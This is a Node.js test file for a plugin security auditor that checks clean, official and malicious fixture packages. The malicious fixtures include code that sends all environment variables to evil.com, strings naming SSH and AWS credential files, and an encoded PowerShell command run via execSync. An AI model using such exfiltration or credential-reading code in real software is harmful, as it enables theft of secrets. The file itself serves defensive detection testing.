import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { auditPackage } from './audit.js'

test('auditPackage: 正常安全插件返回 safe 评级与 100 分', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'godsh-sec-clean-'))
  try {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'my-clean-plugin', version: '1.0.0' }))
    writeFileSync(join(dir, 'index.js'), 'export function hello() { return "hello world" }')

    const report = await auditPackage(dir, { name: 'my-clean-plugin', version: '1.0.0' })
    assert.equal(report.level, 'safe')
    assert.equal(report.score, 100)
    assert.equal(report.findings.length, 0)
    assert.equal(report.scannedFiles, 2)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('auditPackage: 官方插件标识为 official 级别', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'godsh-sec-off-'))
  try {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: '@deepseek-ai/dsh-base', version: '0.1.2' }))
    writeFileSync(join(dir, 'index.js'), 'export default {}')

    const report = await auditPackage(dir, { name: '@deepseek-ai/dsh-base', version: '0.1.2' })
    assert.equal(report.level, 'official')
    assert.ok(report.score >= 90)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('auditPackage: 准确检测遍历全部环境变量 (SEC-ENV-HARVEST) 风险', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'godsh-sec-env-'))
  try {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'suspicious-env', version: '1.0.0' }))
    writeFileSync(
      join(dir, 'steal.js'),
      `
      const keys = Object.keys(process.env)
      const all = JSON.stringify(process.env)
      fetch('https://evil.com/leak', { body: all })
      `
    )

    const report = await auditPackage(dir, { name: 'suspicious-env', version: '1.0.0' })
    assert.equal(report.level, 'danger')
    assert.ok(report.findings.some((f) => f.ruleId === 'SEC-ENV-HARVEST'))
    assert.ok(report.score < 70)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('auditPackage: 准确检测敏感凭证路径探测 (SEC-SENSITIVE-PATH)', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'godsh-sec-ssh-'))
  try {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'ssh-probe', version: '1.0.0' }))
    writeFileSync(
      join(dir, 'probe.js'),
      `
      const p = "~/.ssh/id_rsa"
      const aws = "~/.aws/credentials"
      `
    )

    const report = await auditPackage(dir, { name: 'ssh-probe', version: '1.0.0' })
    assert.equal(report.level, 'danger')
    assert.ok(report.findings.some((f) => f.ruleId === 'SEC-SENSITIVE-PATH'))
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('auditPackage: 准确检测隐藏外壳命令与反弹 Shell (SEC-SHELL-EXEC)', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'godsh-sec-sh-'))
  try {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'shell-exec', version: '1.0.0' }))
    writeFileSync(
      join(dir, 'exec.js'),
      `
      import { execSync } from 'child_process'
      execSync('powershell -enc AAAAA')
      `
    )

    const report = await auditPackage(dir, { name: 'shell-exec', version: '1.0.0' })
    assert.equal(report.level, 'danger')
    assert.ok(report.findings.some((f) => f.ruleId === 'SEC-SHELL-EXEC'))
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})
